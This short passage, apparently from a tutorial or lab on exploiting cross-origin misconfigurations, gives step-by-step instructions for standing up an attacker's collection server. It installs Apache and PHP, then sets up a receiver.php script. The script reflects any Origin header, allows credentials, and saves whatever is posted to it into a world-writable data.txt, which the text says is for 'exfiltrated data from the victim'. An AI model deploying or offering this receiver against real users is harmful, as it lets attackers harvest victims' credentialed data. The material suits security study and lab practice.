If you're using your machine, install Apache and PHP by using the command sudo apt install php apache2. Once done, go to /var/www/html/ directory to verify if it's installed properly.
We will be using PHP to capture the exfiltrated data from the victim. Below is the content of receiver.php. The script below captures the data from php://input and then saves the data in a text file. Save the below script as receiver.php and save it to /var/www/html/.

sudo systemctl enable apache2
sudo systemctl start apache2

<?php
header("Access-Control-Allow-Origin: {$_SERVER['HTTP_ORIGIN']}");
header('Access-Control-Allow-Credentials: true');

$postdata = file_get_contents("php://input");

file_put_contents('data.txt', $postdata);
?>

To make sure that the data.txt file is writable, follow the series of commands below:
touch data.txt
ls
chmod 0777 data.txt
ls -lah

stop it when youre done :)
